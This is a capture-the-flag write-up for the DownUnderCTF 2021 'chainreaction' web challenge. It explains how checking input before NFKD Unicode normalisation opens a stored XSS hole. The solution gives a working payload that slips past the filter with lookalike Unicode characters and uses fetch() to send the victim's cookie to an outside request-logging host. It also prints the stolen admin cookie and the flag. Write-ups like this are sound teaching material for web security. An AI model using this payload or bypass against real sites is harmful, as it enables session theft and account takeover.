# Challenge
A bunch of university students want to start a company and hired some young university students. I wonder if they paid any attention to security.  
  
# Setup
Website: https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf  
  
# Solution
At the bottom of the login page of the website, we see a link to the developer portal. When we visit `/dev`, we see that the website "is still under construction", and it instead directs us to either `/devchat` or `/admin`. Visiting `/admin` redirects us to `/login` with the flashed message `Not allowed.` at the top of the page. This indicates we need to have some admin "cookie" set in order to proceed.  
  
Visiting `/devchat` instead shows us messages between developers, which give us useful information:
<ol>
  <li> "For now I have set a static cookie, but Ill fix that up on Monday." -> confirms our theory about the admin cookie </li>
  <li> "bruh... you basically just added a vulnerability, why tf are you normalizing after checking the bad characters" -> upon searching for "normalising characters", we see that this probably refers to decomposing Unicode characters into constituent, or smaller parts/a part. </li>
  <li> "Only used it once for a uni project this semester, NFKD I think it was" -> NKFD is a Unicode normalisation scheme, so this solidifies the idea of a normalising user inputted characters. The fact that the developer is normalising after checking for some "bad" payload indicates that to exploit this website, we should "smuggle" these bad strings through Unicode characters which are only unpackaged after input validation, like a Trojan horse. </li>
  <li> "Also the about me section was all html escaped making it look ugly, need to try and find a fix for that as well. It looks very ugly." -> this was sent after a developer said the page was autoescaped because values were inputted raw (which would introduce an XSS vulnerability), however now that that feature seems to be raw. This indicates we need to construct an XSS attack which sends a user's cookie to some proxy, report the error to the admins, check the proxy and retrieve their cookie </li>
</ol>
To test our idea of the XSS, we can register an account, log into it and view our profile page. After entering `" hidden value="` into the "About me" field and updating our information, we see that the field disappears:
[!About me field is gone](disap.png)
However, if we try to enter `<script>`, we see that the website detects a "hacking attempt":
[!Hacking attempt](hackattempt.png)
Not only does this occur for the angle brackets but also simply the string "script". This is where our knowledge of the NFKD normalisation algorithm comes from: we can enter a string which has alternative "Unicode" versions of the angle brackets and one of the letters of "script" to bypass the XSS detection and then have the payload be decomposed with NFKD. Our final payload looks like this (I used RequestBin as the proxy):
```
"＞＜scᴿipt＞ fetch(`https://[my_bin].x.pipedream.net/c=${document.cookie}`)＜/scᴿipt＞
```
Then, after retrieving the cookie **sup3rs3cur34dm1nc00k13**, we can set it on our browser and visit the `/admin` page to read the flag.  
Flag: **DUCTF{\_un1c0de\_bypass_x55_ftw!}**
